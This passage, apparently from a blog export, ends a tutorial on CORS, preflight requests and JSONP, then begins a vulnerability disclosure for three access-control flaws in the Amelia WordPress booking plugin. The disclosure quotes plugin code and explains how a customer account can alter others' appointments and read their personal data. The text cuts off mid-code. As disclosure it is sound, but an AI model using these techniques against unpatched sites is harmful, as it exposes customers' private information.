says: “If you want to transfer data between different origins, what should you do?” This regulation is called CORS. CORS, short for Cross-Origin Resource Sharing, is a cross-origin resource sharing protocol. This protocol tells you that if you want to open cross-origin HTTP requests, the server must add Access-Control-Allow-Origin to the response header. You should be familiar with this field. If you feel unfamiliar, you can go back and look at the error message just now, which actually mentioned this header. After the browser receives the response, it will first check the content of Access-Control-Allow-Origin. If it contains the origin of the request that is currently being initiated, it will allow it to pass and allow the program to receive the response smoothly. If you carefully check the request we sent to Twitch in the beginning, you will find that the header of the response is roughly like this: Content-Type: application&#x2F;json Content-Length: 71 Connection: keep-alive Server: nginx Access-Control-Allow-Origin: * Cache-Control: no-cache, no-store, must-revalidate, private Expires: 0 Pragma: no-cache Twitch-Trace-Id: e316ddcf2fa38a659fa95af9012c9358 X-Ctxlog-Logid: 1-5920052c-446a91950e3abed21a360bd5 Timing-Allow-Origin: https:&#x2F;&#x2F;www.twitch.tv The key point is this line: Access-Control-Allow-Origin: *, where the asterisk represents a wildcard character, meaning that any origin is accepted. Therefore, when the browser receives this response, it compares the current origin with the * rule, passes the verification, and allows us to accept the response of the cross-origin request. In addition to this header, there are actually others that can be used, such as Access-Control-Allow-Headers and Access-Control-Allow-Methods, which can define which request headers and methods are accepted. To sum up, if you want to initiate a cross-origin HTTP request and receive a response smoothly, you need to ensure that the server side has added Access-Control-Allow-Origin, otherwise the response will be blocked by the browser and an error message will be displayed. Preflight RequestDo you still remember Twitch’s API documentation? It requires a client-id parameter, and the document says that you can pass it in the GET parameter or in the header. Let’s try passing it in the header! Open Devtool, and you will see a magical phenomenon: Huh? I clearly only sent one request, why did it become two? And the method of the first one is actually OPTIONS. Why did adding one header result in an extra request? In fact, this is also related to CORS mentioned above. CORS divides requests into two types, one is a simple request. What is a simple request? There is actually a long definition, which I think you can read when you need it. But in short, if you don’t add any custom headers, and it’s a GET request, it’s definitely a simple request (isn’t this simple enough?). On the contrary, if you add some custom headers, such as the Client-ID we just added, this request is definitely not a simple request. (Definition reference: MDN: Simple Request) From the above classification, we know that the request we just initiated is not a simple request because it has a custom header. So why is there an extra request? This request is called a Preflight Request, which is used to confirm whether subsequent requests can be sent because non-simple requests may contain some user data. If this Preflight Request fails, the real request will not be sent, which is the purpose of the Preflight Request. Let me give you an example, and you will know why this Preflight Request is needed. Assuming that a server provides an API URL called: https://example.com/data/16, you can get the data with id 16 by sending a GET request to it, and you can delete this data by sending a DELETE request to it. If there is no Preflight Request mechanism, I can send a DELETE request to this API on any web page of any domain. As I emphasized earlier, the browser’s CORS mechanism will still help you send the request, but only the response will be blocked by the browser. Therefore, even though there is no response, the server did receive this request, so it will delete this data. If there is a Preflight Request, when receiving the result of the request, it will know that this API does not provide CORS, so the real DELETE request will not be sent, and it will end here. The purpose of the Preflight Request is to use an OPTIONS request to confirm whether the subsequent request can be sent. JSONPFinally, let’s talk about JSONP, which is another method for cross-origin requests besides CORS, called JSON with Padding. Do you remember the same-origin policy mentioned at the beginning? If you think about it carefully, you will find that some things are not restricted by the same-origin policy, such as the &lt;script&gt; tag. Don’t we often refer to third-party packages such as CDN or Google Analytics on web pages? The URLs are all from other domains, but they can be loaded normally. JSONP uses this feature of &lt;script&gt; to achieve cross-origin requests. Imagine you have an HTML like this: &lt;script> var response = &#123; data: 'test' &#125;; &lt;/script> &lt;script> console.log(response); &lt;/script> It’s a very easy-to-understand piece of code, so I won’t explain it much. What if you replace the above code with a URL? &lt;script src=\"https://another-origin.com/api/games\">&lt;/script> &lt;script> console.log(response); &lt;/script> If the content returned by https://another-origin.com/api/games is the same as before: var response = &#123; data: 'test' &#125;; Then can’t I get the data in the same way? And these data are still controlled by the server, so the server can give me any data. But using global variables like this is not very good. We can use the concept of Callback Function just mentioned and change it to this: &lt;script> receiveData(&#123; data: 'test' &#125;); &lt;/script> &lt;script> function receiveData (response) &#123; console.log(response); &#125; &lt;/script> So what is JSONP? JSONP actually uses the above format to put data in &lt;script&gt; and bring the data back through the specified function. If you think of the first &lt;script&gt; as the server’s return value, you will understand. In practice, when operating JSONP, the server usually provides a callback parameter for the client to bring over. The Twitch API provides a JSONP version, and we can directly look at the example. URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=aaa&amp;limit=1 aaa(&#123;\"_total\":1069,\"_links\":&#123;\"self\":\"https://api.twitch.tv/kraken/games/top?limit=1\",\"next\":\"https://api.twitch.tv/kraken/games/top?limit=1\\u0026offset=1\"&#125;,\"top\":[&#123;\"game\":&#123;\"name\":\"Dota 2\",\"popularity\":63361,\"_id\":29595,\"giantbomb_id\":32887,\"box\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"logo\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"_links\":&#123;&#125;,\"localized_name\":\"Dota 2\",\"locale\":\"zh-tw\"&#125;,\"viewers\":65243,\"channels\":373&#125;]&#125;) URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1 receiveData(&#123;\"_total\":1067,\"_links\":&#123;\"self\":\"https://api.twitch.tv/kraken/games/top?limit=1\",\"next\":\"https://api.twitch.tv/kraken/games/top?limit=1\\u0026offset=1\"&#125;,\"top\":[&#123;\"game\":&#123;\"name\":\"Dota 2\",\"popularity\":63361,\"_id\":29595,\"giantbomb_id\":32887,\"box\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"logo\":&#123;\"large\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg\",\"medium\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg\",\"small\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg\",\"template\":\"https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg\"&#125;,\"_links\":&#123;&#125;,\"localized_name\":\"Dota 2\",\"locale\":\"zh-tw\"&#125;,\"viewers\":65622,\"channels\":376&#125;]&#125;) Have you noticed? It passes the callback parameter you brought over as the function name and passes the entire JavaScript object to the Function, so you can get the data inside the Function. Combined, it would look like this: &lt;script src=\"https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1\">&lt;/script> &lt;script> function receiveData (response) &#123; console.log(response); &#125; &lt;/script> Using JSONP, you can also access cross-origin data. However, the disadvantage of JSONP is that the parameters you need to pass can only be passed through the URL in a GET request, and cannot be passed through a POST request. If CORS can be used, it should be prioritized over JSONP. SummaryThe content of this article starts with the process of fetching data and tells you step by step where to fetch it and how to fetch it. If you want to fetch data using an API, what is an API? How to call Web API in JavaScript? How to access cross-origin data? Generally speaking, I have mentioned everything related to fetching data with the front-end, but there is a regret that I did not mention the Fetch API, which is a newer standard used to fetch data. The introduction on MDN is: The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set. Interested readers can check it out for themselves. I hope that after reading this article, you will have a better understanding of how to connect to the back-end API and the difficulties you may encounter when connecting.","link":"/2017/08/27/en/ajax-and-cors/"},{"title":"Sensitive Data Disclosure in WordPress Plugin Amelia < 1.0.49","text":"Amelia is a WordPress plugin for booking systems developed by TNS. With 40,000+ active installations, it has been used for the clinic, hair salon, tutor, and so on. In March, we studied the source code of Amelia and found three vulnerabilities in the end: CVE-2022-0720 Amelia &lt; 1.0.47 - Customer+ Arbitrary Appointments Update and Sensitive Data Disclosure (CVSS 6.3) CVE-2022-0825 Amelia &lt; 1.0.49 - Customer+ Arbitrary Appointments Status Update (CVSS 6.3) CVE-2022-0837 Amelia &lt; 1.0.48 - Customer+ SMS Service Abuse and Sensitive Data Disclosure (CVSS 5.4) By exploiting these vulnerabilities, a malicious actor could get all the customer’s data, including name, phone, and booking details. In this article, I will talk about the code structure of Amelia and the details of three vulnerabilities. A Brief Introduction to AmeliaAfter installing Amelia plugin, the admin can create a new booking page: As a customer, basic personal information like name and email should be provided before making a booking: After the customer finished booking, Amelia will create a new low-privilege account for it and send a reset password email to enable the account. Then, the customer can log into WordPress and manage their bookings: How WordPress Plugin Works and the Code Structure of AmeliaWhen developing a WordPress plugin, the developer uses add_action to add a hook to the WordPress system. The hook function will be invoked when the corresponding action has been called. The action starts with wp_ajax_nopriv_ can be invoked via wp-admin/admin-ajax.php, following is the excerpt of admin-ajax.php: &lt;?php $action = $_REQUEST['action']; if ( is_user_logged_in() ) &#123; // If no action is registered, return a Bad Request response. if ( ! has_action( \"wp_ajax_&#123;$action&#125;\" ) ) &#123; wp_die( '0', 400 ); &#125; /** * Fires authenticated Ajax actions for logged-in users. * * The dynamic portion of the hook name, `$action`, refers * to the name of the Ajax action callback being fired. * * @since 2.1.0 */ do_action( \"wp_ajax_&#123;$action&#125;\" ); &#125; else &#123; // If no action is registered, return a Bad Request response. if ( ! has_action( \"wp_ajax_nopriv_&#123;$action&#125;\" ) ) &#123; wp_die( '0', 400 ); &#125; /** * Fires non-authenticated Ajax actions for logged-out users. * * The dynamic portion of the hook name, `$action`, refers * to the name of the Ajax action callback being fired. * * @since 2.8.0 */ do_action( \"wp_ajax_nopriv_&#123;$action&#125;\" ); &#125; ?> Amelia registered two hooks in ameliabooking.php: /** Isolate API calls */ add_action('wp_ajax_wpamelia_api', array('AmeliaBooking\\Plugin', 'wpAmeliaApiCall')); add_action('wp_ajax_nopriv_wpamelia_api', array('AmeliaBooking\\Plugin', 'wpAmeliaApiCall')); The difference between wp_ajax_wpamelia_api and wp_ajax_nopriv_wpamelia_api is that the former requires authenticated user to perform the action, while the latter requires none. As you can see, many plugins choose to handle both actions in the same place, to deal with the permission check itself. In wpAmeliaApiCall, a few routes have been registered: /** * API Call * * @throws \\InvalidArgumentException */ public static function wpAmeliaApiCall() &#123; try &#123; /** @var Container $container */ $container = require AMELIA_PATH . '/src/Infrastructure/ContainerConfig/container.php'; $app = new App($container); // Initialize all API routes Routes::routes($app); $app->run(); exit(); &#125; catch (Exception $e) &#123; echo 'ERROR: ' . $e->getMessage(); &#125; &#125; There are a few files in src/Infrastructure/Routes folder for handling routing. For example, src/Infrastructure/Routes/User/User.php is responsible for the routing of /users: /** * Class User * * @package AmeliaBooking\\Infrastructure\\Routes\\User */ class User &#123; /** * @param App $app */ public static function routes(App $app) &#123; $app->get('/users/wp-users', GetWPUsersController::class); $app->post('/users/authenticate', LoginCabinetController::class); $app->post('/users/logout', LogoutCabinetController::class); // Customers $app->get('/users/customers/&#123;id:[0-9]+&#125;', GetCustomerController::class); $app->get('/users/customers', GetCustomersController::class); $app->post('/users/customers', AddCustomerController::class); $app->post('/users/customers/&#123;id:[0-9]+&#125;', UpdateCustomerController::class); $app->post('/users/customers/delete/&#123;id:[0-9]+&#125;', DeleteUserController::class); $app->get('/users/customers/effect/&#123;id:[0-9]+&#125;', GetUserDeleteEffectController::class); $app->post('/users/customers/reauthorize', ReauthorizeController::class); // Providers $app->get('/users/providers/&#123;id:[0-9]+&#125;', GetProviderController::class); $app->get('/users/providers', GetProvidersController::class); $app->post('/users/providers', AddProviderController::class); $app->post('/users/providers/&#123;id:[0-9]+&#125;', UpdateProviderController::class); $app->post('/users/providers/status/&#123;id:[0-9]+&#125;', UpdateProviderStatusController::class); $app->post('/users/providers/delete/&#123;id:[0-9]+&#125;', DeleteUserController::class); $app->get('/users/providers/effect/&#123;id:[0-9]+&#125;', GetUserDeleteEffectController::class); // Current User $app->get('/users/current', GetCurrentUserController::class); &#125; &#125; Usually, the routing is related to the URL path directly, but Amelia is a bit different because it’s a WordPress plugin. In Amelia, it’s based on the query string, instead of the path of URL(src/Infrastructure/ContainerConfig/request.php): &lt;?php use Slim\\Http\\Request; use Slim\\Http\\Uri; $entries['request'] = function (AmeliaBooking\\Infrastructure\\Common\\Container $c) &#123; $curUri = Uri::createFromEnvironment($c->get('environment')); // Note: AMELIA_ACTION_SLUG = \"action=wpamelia_api&amp;call=\" $newRoute = str_replace( ['XDEBUG_SESSION_START=PHPSTORM&amp;' . AMELIA_ACTION_SLUG, AMELIA_ACTION_SLUG], '', $curUri->getQuery() ); $newPath = strpos($newRoute, '&amp;') ? substr( $newRoute, 0, strpos($newRoute, '&amp;') ) : $newRoute; $newQuery = strpos($newRoute, '&amp;') ? substr( $newRoute, strpos($newRoute, '&amp;') + 1 ) : ''; $request = Request::createFromEnvironment($c->get('environment')) ->withUri( $curUri ->withPath($newPath) ->withQuery($newQuery) ); if (method_exists($request, 'getParam') &amp;&amp; $request->getParam('showAmeliaErrors')) &#123; ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); &#125; return $request; &#125;; For example, when the request URL is /wordpress/wp-admin/admin-ajax.php?action=wpamelia_api&amp;call=/users/wp-users, query string is action=wpamelia_api&amp;call=/users/wp-users. After AMELIA_ACTION_SLUG has been replaced with empty string, the remaining part is /users/wp-users, that’s how the system handles routes. Let’s check GetWPUsersController::class, the corresponding controller for /users/wp-users: &lt;?php namespace AmeliaBooking\\Application\\Controller\\User; use AmeliaBooking\\Application\\Commands\\User\\GetWPUsersCommand; use AmeliaBooking\\Application\\Controller\\Controller; use Slim\\Http\\Request; /** * Class GetWPUsersController * * @package AmeliaBooking\\Application\\Controller\\User */ class GetWPUsersController extends Controller &#123; /** * Instantiates the Get WP Users command to hand it over to the Command Handler * * @param Request $request * @param $args * * @return GetWPUsersCommand * @throws \\RuntimeException */ protected function instantiateCommand(Request $request, $args) &#123; $command = new GetWPUsersCommand($args); $command->setField('id', (int)$request->getQueryParam('id')); $command->setField('role', $request->getQueryParam('role')); $requestBody = $request->getParsedBody(); $this->setCommandFields($command, $requestBody); return $command; &#125; &#125; We can see a classic design pattern here: Command Pattern, every action is a command. The command will be processed by its parent class AmeliaBooking\\Application\\Controller\\Controller: /** * @param Request $request * @param Response $response * @param $args * * @return Response * @throws \\InvalidArgumentException * @throws \\RuntimeException */ public function __invoke(Request $request, Response $response, $args) &#123; /** @var Command $command */ $command = $this->instantiateCommand($request, $args); if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &amp;&amp; ( $command instanceof DeleteUserCommand || $command instanceof DeletePackageCommand || $command instanceof DeleteCategoryCommand || $command instanceof DeleteServiceCommand || $command instanceof DeleteExtraCommand || $command instanceof DeleteLocationCommand || $command instanceof DeleteEventCommand || $command instanceof DeletePaymentCommand || $command instanceof DeleteCouponCommand || $command instanceof DeleteCustomFieldCommand || $command instanceof DeleteAppointmentCommand || $command instanceof DeleteBookingCommand || $command instanceof DeleteEventBookingCommand || $command instanceof DeletePackageCustomerCommand || $command instanceof DeleteNotificationCommand ) ) &#123; return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); &#125; /** @var CommandResult $commandResult */ $commandResult = $this->commandBus->handle($command); if ($commandResult->getUrl() !== null) &#123; $this->emitSuccessEvent($this->eventBus, $commandResult); /** @var Response $response */ $response = $response->withHeader('Location', $commandResult->getUrl()); $response = $response->withStatus(self::STATUS_REDIRECT); return $response; &#125; if ($commandResult->hasAttachment() === false) &#123; $responseBody = [ 'message' => $commandResult->getMessage(), 'data' => $commandResult->getData() ]; $this->emitSuccessEvent($this->eventBus, $commandResult); switch ($commandResult->getResult()) &#123; case (CommandResult::RESULT_SUCCESS): $response = $response->withStatus(self::STATUS_OK); break; case (CommandResult::RESULT_CONFLICT): $response = $response->withStatus(self::STATUS_CONFLICT); break; default: $response = $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); break; &#125; /** @var Response $response */ $response = $response->withHeader('Content-Type', 'application/json;charset=utf-8'); $response = $response->write( json_encode( $commandResult->hasDataInResponse() ? $responseBody : array_merge($responseBody, ['data' => []]) ) ); &#125; return $response; &#125; After instantiated the command, it called $this-&gt;commandBus-&gt;handle($command). Following is the excerpt of src/Infrastructure/ContainerConfig/command.bus.php: &lt;?php defined('ABSPATH') or die('No script kiddies please!'); // @codingStandardsIgnoreStart $entries['command.bus'] = function ($c) &#123; $commands = [ // User User\\DeleteUserCommand::class => new User\\DeleteUserCommandHandler($c), User\\GetCurrentUserCommand::class => new User\\GetCurrentUserCommandHandler($c), User\\GetUserDeleteEffectCommand::class => new User\\GetUserDeleteEffectCommandHandler($c), User\\GetWPUsersCommand::class => new User\\GetWPUsersCommandHandler($c), // more commands... ]; return League\\Tactician\\Setup\\QuickStart::create($commands); &#125;; // @codingStandardsIgnoreEnd We can see that the GetWPUsersCommand is taken by User\\GetWPUsersCommandHandler, so the main logic is inside this file: class GetWPUsersCommandHandler extends CommandHandler &#123; /** * @param GetWPUsersCommand $command * * @return CommandResult * @throws AccessDeniedException * @throws InvalidArgumentException * @throws \\AmeliaBooking\\Infrastructure\\Common\\Exceptions\\QueryExecutionException * @throws \\Interop\\Container\\Exception\\ContainerException */ public function handle(GetWPUsersCommand $command) &#123; if (!$this->getContainer()->getPermissionsService()->currentUserCanRead(Entities::EMPLOYEES)) &#123; throw new AccessDeniedException('You are not allowed to read employees.'); &#125; if (!$this->getContainer()->getPermissionsService()->currentUserCanRead(Entities::CUSTOMERS)) &#123; throw new AccessDeniedException('You are not allowed to read customers.'); &#125; $result = new CommandResult(); $this->checkMandatoryFields($command); /** @var UserService $userService */ $userService = $this->container->get('users.service'); $adminIds = $userService->getWpUserIdsByRoles(['administrator']); /** @var WPUserRepository $wpUserRepository */ $wpUserRepository = $this->getContainer()->get('domain.wpUsers.repository'); $result->setResult(CommandResult::RESULT_SUCCESS); $result->setMessage('Successfully retrieved users.'); $result->setData([ Entities::USER . 's' => $wpUserRepository->getAllNonRelatedWPUsers($command->getFields(), $adminIds) ]); return $result; &#125; &#125; Besides, you can also see the part of permission check: if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &amp;&amp; ( $command instanceof DeleteUserCommand || $command instanceof DeletePackageCommand || $command instanceof DeleteCategoryCommand || $command instanceof DeleteServiceCommand || $command instanceof DeleteExtraCommand || $command instanceof DeleteLocationCommand || $command instanceof DeleteEventCommand || $command instanceof DeletePaymentCommand || $command instanceof DeleteCouponCommand || $command instanceof DeleteCustomFieldCommand || $command instanceof DeleteAppointmentCommand || $command instanceof DeleteBookingCommand || $command instanceof DeleteEventBookingCommand || $command instanceof DeletePackageCustomerCommand || $command instanceof DeleteNotificationCommand ) ) &#123; return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); &#125; If the command is about deleting, need to pass the check of wp_verify_nonce, what is it? wp_verify_nonce is a function provided by WordPress to perform security check. This nonce is generated in admin page via var wpAmeliaNonce = &#39;&lt;?php echo wp_create_nonce(&#39;ajax-nonce&#39;); ?&gt;&#39;;, and the nonce is actually the result of hashing. In theory, it’s not possible to spoof the nonce unless you can get the salt, which is generated randomly at install time: define('AUTH_KEY', ' Xakm&lt;o xQy rw4EMsLKM-?!T+,PFF&#125;)H4lzcW57AF0U@N@&lt; >M%G4Yt>f`z]MON'); define('SECURE_AUTH_KEY', 'LzJ&#125;op]mr|6+![P&#125;Ak:uNdJCJZd>(Hx.-Mh#Tz)pCIU#uGEnfFz|f ;;eU%/U^O~'); define('LOGGED_IN_KEY', '|i|Ux`9&lt;p-h$aFf(qnT:sDO:D1P^wZ$$/Ra@miTJi9G;ddp_&lt;q&#125;6H1)o|a +&amp;JCM'); define('NONCE_KEY', '%:R&#123;[P|,s.KuMltH5&#125;cI;/k&lt;Gx~j!f0I)m_sIyu+&amp;NJZ)-iO>z7X>QYR0Z_XnZ@|'); define('AUTH_SALT', 'eZyT)-Naw]F8CwA*VaW#q*|.)g@o&#125;||wf~@C-YSt&#125;(dh_r6EbI#A,y|nU2&#123;B#JBW'); define('SECURE_AUTH_SALT', '!=oLUTXh,QW=H `&#125;`L|9/^4-3 STz&#125;,T(w&#125;W&lt;I`.JjPi)&lt;Bmf1v,HpGe&#125;T1:Xt7n'); define('LOGGED_IN_SALT', '+XSqHc;@Q*K_b|Z?NC[3H!!EONbh.n&lt;+=uKR:>*c(u`g~EJBf#8u#R&#123;mUEZrozmm'); define('NONCE_SALT', 'h`GXHhD>SLWVfg1(1(N&#123;;.V!MoE(SfbA_ksP@&amp;`+AycHcAV$+?@3q+rxV&#123;%^VyKT'); So, we can ensure that only authenticated users have the ability to use certain features via wp_verify_nonce. Phew! That’s all about the structure of Amelia. It’s elegant compared to other plugins, and it’s easy to find what you want. Finally, it’s time to talk about the vulnerabilities. CVE-2022-0720: Amelia &lt; 1.0.47 - Customer+ Arbitrary Appointments Update and Sensitive Data DisclosureThere are two modules for managing the booking. One is “Appointment”, the other is “Booking”, it’s a one-to-many relationship. One appointment can have multiple bookings. Below are the routes for the appointment module: src/Infrastructure/Routes/Booking/Appointment/Appointment.php class Appointment &#123; /** * @param App $app * * @throws \\InvalidArgumentException */ public static function routes(App $app) &#123; $app->get('/appointments', GetAppointmentsController::class); $app->get('/appointments/&#123;id:[0-9]+&#125;', GetAppointmentController::class); $app->post('/appointments', AddAppointmentController::class); $app->post('/appointments/delete/&#123;id:[0-9]+&#125;', DeleteAppointmentController::class); $app->post('/appointments/&#123;id:[0-9]+&#125;', UpdateAppointmentController::class); $app->post('/appointments/status/&#123;id:[0-9]+&#125;', UpdateAppointmentStatusController::class); $app->post('/appointments/time/&#123;id:[0-9]+&#125;', UpdateAppointmentTimeController::class); &#125; &#125; Take /appointments/&#123;id:[0-9]+&#125; as an example, you can’t see other customer’s booking because there is a line to remove it in GetAppointmentCommandHandler: $customerAS->removeBookingsForOtherCustomers($user, new Collection([$appointment])); And here is the file for updating appointment(UpdateAppointmentCommandHandler.php): try &#123; /** @var AbstractUser $user */ $user = $userAS->authorization( $command->getPage() === 'cabinet' ? $command->getToken() : null, $command->getCabinetType() ); &#125; catch (AuthorizationException $e) &#123; $result->setResult(CommandResult::RESULT_ERROR); $result->setData( [ 'reauthorize' => true ] ); return $result; &#125; if ($userAS->isProvider($user) &amp;&amp; !$settingsDS->getSetting('roles', 'allowWriteAppointments')) &#123; throw new AccessDeniedException('You are not allowed to update appointment'); &#125; // update appointment In the beginning, there are two checks. The first one is to check if the user is logged in, and the second one is to check if the user’s role is “Provider”. There are a few roles in Amelia: Customer, (Service) Provider, and Admin. So, as a customer, we can pass the check and update other customer’s appointments! When the customer manages their bookings, they use another module called “booking” because the appointment module is for providers. I guess that’s why there is no permission check for the customer role because the developer has a false assumption that the customer won’t access this endpoint at all. What can we do besides updating the booking? Let’s see the response: There is a field called “info”, it contains the personal data of the customer who booked it. This field is added by processBooking in src/Application/Services/Reservation/AbstractReservationService.php : $appointmentData['bookings'][0]['info'] = json_encode( [ 'firstName' => $appointmentData['bookings'][0]['customer']['firstName'], 'lastName' => $appointmentData['bookings'][0]['customer']['lastName'], 'phone' => $appointmentData['bookings'][0]['customer']['phone'], 'locale' => $appointmentData['locale'], 'timeZone' => $appointmentData['timeZone'], 'urlParams' => !empty($appointmentData['urlParams']) ? $appointmentData['urlParams'] : null, ] ); To sum up, a customer can update other customers’ appointments and see their personal information due to a flawed permission check. Moreover, the appointment ID is a serial number so it’s easy to enumerate. RemediationIn 1.0.47, they made two changes. The first one is to implement the permission check for customer: if ($userAS->isCustomer($user)) &#123; throw new AccessDeniedException('You are not allowed to update appointment'); &#125; The other is about the permission check for routes, from the positive list to the negative list, only a few commands are accessible without logging in: public function validateNonce($request) &#123; if ($request->getMethod() === 'POST' &amp;&amp; !self::getToken() &amp;&amp; !($this instanceof LoginCabinetCommand) &amp;&amp; !($this instanceof AddBookingCommand) &amp;&amp; !($this instanceof AddStatsCommand) &amp;&amp; !($this instanceof MolliePaymentCommand) &amp;&amp; !($this instanceof MolliePaymentNotifyCommand) &amp;&amp; !($this instanceof PayPalPaymentCommand) &amp;&amp; !($this instanceof PayPalPaymentCallbackCommand) &amp;&amp; !($this instanceof RazorpayPaymentCommand) &amp;&amp; !($this instanceof WooCommercePaymentCommand) &amp;&amp; !($this instanceof SuccessfulBookingCommand) ) &#123; return wp_verify_nonce($request->getQueryParams()['ameliaNonce'], 'ajax-nonce'); &#125; return true; &#125; CVE-2022-0825: Amelia &lt; 1.0.49 - Customer+ Arbitrary Appointments Status UpdateThis vulnerability is quite similar to the previous one, it’s also about permission check. The route for updating appointment status is $app-&gt;post(&#39;/appointments/status/&#123;id:[0-9]+&#125;&#39;, UpdateAppointmentStatusController::class);, and the main handler is src/Application/Commands/Booking/Appointment/UpdateAppointmentStatusCommandHandler.php. There is a permission check in the very beginning: if (!$this->getContainer()->getPermissionsService()->currentUserCanWriteStatus(Entities::APPOINTMENTS)) &#123; throw new AccessDeniedException('You are not allowed to update appointment status'); &#125; // update appointment Let’s dive in and see what is the implementation of currentUserCanWriteStatus: public function currentUserCanWriteStatus($object) &#123; return $this->userCan($this->currentUser, $object, self::WRITE_STATUS_PERMISSIONS); &#125; Keep diving, check userCan： public function userCan($user, $object, $permission) &#123; if ($user instanceof Admin) &#123; return true; &#125; return $this->permissionsChecker->checkPermissions($user, $object, $permission); &#125; In src/Infrastructure/WP/PermissionsService/PermissionsChecker.php, we can find the implementation of checkPermissions: public function checkPermissions($user, $object, $permission) &#123; // Admin can do all if ($user instanceof Admin) &#123; return true; &#125; // Get the WP role name of the user, rollback to customer by default $wpRoleName = $user !== null ? 'wpamelia-' . $user->getType() : 'wpamelia-customer'; // Get the wp name of capability we are looking for. $wpCapability = \"amelia_&#123;$permission&#125;_&#123;$object&#125;\"; if ($user !== null &amp;&amp; $user->getExternalId() !== null) &#123; return user_can($user->getExternalId()->getValue(), $wpCapability); &#125; // If user is guest check does it have capability $wpRole = get_role($wpRoleName); return $wpRole !== null &amp;&amp; isset($wpRole->capabilities[$wpCapability]) ? (bool)$wpRole->capabilities[$wpCapability] : false; &#125; It was noteworthy that if the user is null, it will be treated as a customer. To check if a role has certain permission, we need to see the capabilities table in src/Infrastructure/WP/config/Roles.php: // Customer [ 'name' => 'wpamelia-customer', 'label' => __('Amelia Customer', 'amelia'), 'capabilities' => [ 'read' => true, 'amelia_read_menu' => true, 'amelia_read_calendar' => true, 'amelia_read_appointments' => true, 'amelia_read_events' => true, 'amelia_write_status_appointments' => true, 'amelia_write_time_appointments' => true, ] ], amelia_write_status_appointments is true, so the customer has permission to update the appointment status. The rest part is just like the last vulnerability, the response of updating the appointment has a field called info, which contains the personal information of the customer who booked it. By the way, the vulnerability is pre-auth before 1.0.48, because in 1.0.47 the permission check for routes is incomplete, an unauthenticated user can access this endpoint as well. RemediationCustomer role has no permission of amelia_write_status_appointments since 1.0.49. CVE-2022-0837: Amelia &lt; 1.0.48 - Customer+ SMS Service Abuse and Sensitive Data DisclosureLet’s see the last vulnerability, it’s still about permission check. The route is $app-&gt;post(&#39;/notifications/sms&#39;, SendAmeliaSmsApiRequestController::class);, and the handler is SendAmeliaSmsApiRequestCommandHandler: public function handle(SendAmeliaSmsApiRequestCommand $command) &#123; $result = new CommandResult(); /** @var SMSAPIServiceInterface $smsApiService */ $smsApiService = $this->getContainer()->get('application.smsApi.service'); // Call method dynamically and pass data to the function. Method name is the request field. $apiResponse = $smsApiService->&#123;$command->getField('action')&#125;($command->getField('data')); $result->setResult(CommandResult::RESULT_SUCCESS); $result->setMessage('Amelia SMS API request successful'); $result->setData($apiResponse); return $result; &#125; As you see, there is no permission check at all, and we can control the parameters here: $apiResponse = $smsApiService->&#123;$command->getField('action')&#125;($command->getField('data')); There are few methods with only one parameter, including getUserInfo, getPaymentHistory and testNotification: public function getUserInfo() &#123; $route = 'auth/info'; return $this->sendRequest($route, true); &#125; public function getPaymentHistory($data) &#123; $route = '/payment/history'; return $this->sendRequest($route, true, $data); &#125; public function testNotification($data) &#123; $route = '/sms/send'; /** @var SettingsService $settingsService */ $settingsService = $this->container->get('domain.settings.service'); /** @var EmailNotificationService $notificationService */ $notificationService = $this->container->get('application.emailNotification.service'); /** @var PlaceholderService $placeholderService */ $placeholderService = $this->container->get(\"application.placeholder.&#123;$data['type']&#125;.service\"); $appointmentsSettings = $settingsService->getCategorySettings('appointments'); $notification = $notificationService->getById($data['notificationTemplate']); $dummyData = $placeholderService->getPlaceholdersDummyData('sms'); $isForCustomer = $notification->getSendTo()->getValue() === NotificationSendTo::CUSTOMER; $placeholderStringRec = 'recurring' . 'Placeholders' . ($isForCustomer ? 'Customer' : '') . 'Sms'; $placeholderStringPack = 'package' . 'Placeholders' . ($isForCustomer ? 'Customer' : '') . 'Sms'; $dummyData['recurring_appointments_details'] = $placeholderService->applyPlaceholders($appointmentsSettings[$placeholderStringRec], $dummyData); $dummyData['package_appointments_details'] = $placeholderService->applyPlaceholders($appointmentsSettings[$placeholderStringPack], $dummyData); $body = $placeholderService->applyPlaceholders( $notification->getContent()->getValue(), $dummyData ); $data = [ 'to' => $data['recipientPhone'], 'from' => 